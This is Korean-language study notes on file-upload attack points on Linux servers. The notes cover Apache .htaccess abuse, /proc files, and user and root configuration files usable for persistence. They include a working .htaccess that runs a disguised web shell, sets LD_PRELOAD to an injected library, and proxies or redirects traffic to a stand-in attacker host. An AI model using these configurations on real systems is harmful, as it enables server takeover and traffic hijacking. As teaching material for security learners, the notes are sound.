파일 업로드 시 공격 지점 :
    일반적으로 웹 서비스는 root 계정 대신 www-data, nginx, apache와 같은 별도의 사용자로 구동되며,
    이상적으로는 ACL(접근 제어 목록) 등의 보안을 통해 웹 서비스 공격 시 그 영향을 최소화해야 합니다.

    만일 웹 서비스가 높은 권한으로 구동된다면 파일 업로드 취약점을 이용한 공격이 용이해집니다. 
    높은 권한이 아니더라도 시스템 관리자가 웹 서비스와 같은 계정으로 로그인한다면 코드 실행 등의 공격이 가능합니다.

    밑에서 리눅스 파일시스템에서 파일 업로드 취약점 공격 시 이용 가능한 지점에 대해 알아봅시다.

1) Apache Web Server
    Apache 웹 서버는 일반적으로 /etc/apache2 나 /etc/httpd 디렉터리에서 서버 설정을 입력받습니다. 
    그러나 AllowOverride 나 AllowOverrideList 디렉티브로 허용할 경우 
    웹 문서 디렉터리 내에서 특정 파일을 추가적으로 설정 파일로 입력받을 수 있습니다. 
    해당 파일명은 기본값은 .htaccess이며, AccessFileName 디렉티브로 변경될 수 있습니다.

    .htaccess 파일이 허용되는 경우 파일 업로드 취약점을 이용해 아래에 같이 .htaccess 를 작성한 후
    웹 문서 디렉터리에 업로드하면 .php 확장자를 우회하여 웹쉘을 실행하거나
    해당 디렉터리 내의 문서를 접근할 때 공격자의 웹 페이지가 접속되는 등 영향을 미치게 됩니다. 
    단 웹마스터가 AllowOverride 및 AllowOverrideList 디렉티브에서 허용한 디렉티브만 사용할 수 있습니다.
    ex)
        # .php 확장자 이외의 다른 파일명 또한 PHP 스크립트로 실행할 수 있도록 합니다.
        <Files "webshell-dreamhack.jpg">
            # php-fpm (PHP FastCGI Process Manager)을 사용하는 경우
            SetHandler "proxy:unix:/run/php-fpm/www.sock|fcgi://localhost"
            
            # Apache2 자체 mod_php를 사용하는 경우
            SetHandler application/x-httpd-php
        </Files>
        
        # Linux에서 CGI 스크립트를 사용하는 경우 아래와 같이 업로드한 동적 라이브러리를 삽입하여 실행하도록 할 수 있습니다.
        SetEnv LD_PRELOAD /var/www/path/to/my/injected/library.so
        
        # 모든 요청이 공격자의 웹서버로 전달되도록 합니다.
        RewriteEngine On
        RewriteOptions inherit
        # mod_proxy_fcgi를 사용하는 경우 FastCGI 서버로 요청 프록시
        RewriteRule (.*) fcgi://attacker.dreamhack.io.$1 [P]
        # mod_proxy_http를 사용하는 경우 HTTP 서버로 요청 프록시
        RewriteRule (.*) http://%{HTTP_HOST}at.attacker.dreamhack.io.$1 [P]
        # HTTP Redirect 사용
        RewriteRule (.*) http://%{HTTP_HOST}at.attacker.dreamhack.io.$1 [R=302,L]
        
        # 에러 페이지를 공격자의 웹 페이지로 리다이렉트합니다.
        ErrorDocument 404 https://attacker.dreamhack.io/
        
    한편 /etc/apache2 디렉터리 변경이 가능한 경우 아래와 같이 업로드한 공유 라이브러리를 로드해 임의 코드 실행이 가능합니다.
    ex)
        LoadFile "/var/www/path/to/my/inejcted/library.so"

2)  /proc (일반 권한) 
    다음은 일반 사용자 권한에서 접근할 수 있는 가상 파일을 정리한 것입니다.
    /proc/<PID>/ 대신 /proc/self/ 를 사용하면 현재 프로세스를 접근하게 됩니다.
    파일 업로드 시 파일 존재 여부를 확인한다면 아래 파일은 사용할 수 없습니다.

        파일                                   설명

    /proc/<PID>/coredump_filter         프로세스 <PID>의 코어 덤프에서 포함될 데이터의 범위를 지정합니다.

    /proc/<PID>/mem                     프로세스 <PID>의 메모리를 접근합니다. 일반적으로 fseek 과 같은 함수로 파일 오프셋을 지정하지 않는 이상 사용할 수 없습니다.

    /proc/<PID>/comm                    프로세스 <PID>의 명칭을 지정합니다.

    /proc/<PID>/sched                   프로세스 <PID>의 스케쥴링 통계 및 측정에 사용됩니다.

    /proc/<PID>/oom_adj,                시스템 메모리 부족 조건 발생 시 프로세스를 강제 종료시켜 메모리를 확보하게 됩니다(OOM killer). 이때 현재 프로세스가 선택되는 우선순위를 조정합니다.
    /proc/<PID>/oom_score_adj


3) 설정 파일 
    다음은 접근 시 root 사용자 권한이 필요 없는 파일을 정리한 것입니다.
    ~ 는 사용자 프로필 디렉터리를 축약한 것으로 /home/admin 등이 있습니다.
     프로필 및 SSH 키는 관리자가 로그온하는 계정과 웹 서버의 계정이 동일할 때에만 유용합니다.

        파일                        설명

    .htaccess                   Apache Web Server에서 웹 문서 디렉터리 내 서버 설정을 제어할 수 있습니다.

    ~/.bashrc, ~/.profile       사용자 로그온 시 실행되는 쉘 명령을 지정합니다.

    ~/.ssh/authorized_keys      해당 사용자에 로그인할 수 있는 SSH 공개키를 지정합니다. 공격자의 SSH 공개키를 추가하면 공격자가 시스템에 로그인할 수 있게 됩니다.

    ~/.ssh/config               SSH 클라이언트 설정 파일입니다. 접속할 호스트 등을 지정하여 악의적인 호스트로 리다이렉트할 수 있습니다.

4) 루트 권한
    웹 서비스가 만일 루트 권한으로 작동한다면 파일 업로드 취약점으로 시스템을 장악할 수 있게 됩니다.
    특히 디렉터리에는 새로운 파일을 생성할 수 있어 파일 존재 여부 검사를 우회할 수 있습니다.

        파일                            설명

    /boot/initramfs-X.Y.Z.img       부팅 시 초기에 사용되는 파일을 저장한 이미지 파일입니다. 부팅 중 시스템 파티션으로 전환되면서 삭제되기 때문에 악성 코드 등이 삽입되면 관리자가 탐지하지 못하는 경우도 있습니다.

    /etc/rc.local                   시스템 부팅 시 실행되는 명령을 지정합니다.

    /etc/crontab                    시스템 부팅 후 주기적으로 실행되는 명령을 지정합니다.

    /etc/profile                    사용자 로그인시마다 실행되는 명령을 지정합니다.


        디렉터리                        설명

    /sys/firmware/efi/efivars        EFI 시스템에서 부팅 옵션을 변경할 수 있습니다. 실제 형식은 EFI 표준에 따라야 하나 강의 범위 밖이므로 설명하지 않습니다.

    /etc/profile.d                   사용자 로그인시마다 실행되는 명령을 지정하는 스크립트를 저장하는 디렉터리입니다.

    /proc, /sys                      루트 권한에서 시스템 제어 시에 사용할 수 있는 각종 파일을 저장합니다.















